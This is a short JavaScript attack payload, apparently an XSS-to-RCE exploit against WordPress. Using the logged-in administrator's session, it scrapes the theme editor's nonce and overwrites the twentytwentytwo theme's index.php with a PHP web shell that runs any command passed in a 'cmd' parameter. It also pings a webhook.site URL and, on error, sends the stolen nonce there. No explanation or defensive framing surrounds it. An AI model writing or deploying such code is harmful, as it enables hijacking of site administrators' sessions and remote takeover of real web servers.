function sleep(ms) {
	return new Promise((r) => setTimeout(r, ms));
}
async function main(){
	try{
	const a = await fetch("wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo",{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
	await sleep(40);
	const kke = await fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8');
	await sleep(40);
	const b = await fetch("wp-admin/admin-ajax.php", {
		"headers":{"Content-type":"application/x-www-form-urlencoded"},
	"body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);}
	?>&action=edit-theme-plugin-file`,
	  "method": "POST",
	  "mode": "cors",
	  "credentials": "include"
	});
	}catch(err){
		const kke = await fetch("wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo",{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
		const k = fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+kke[1]);
	}
}


  
    
    
  
main();
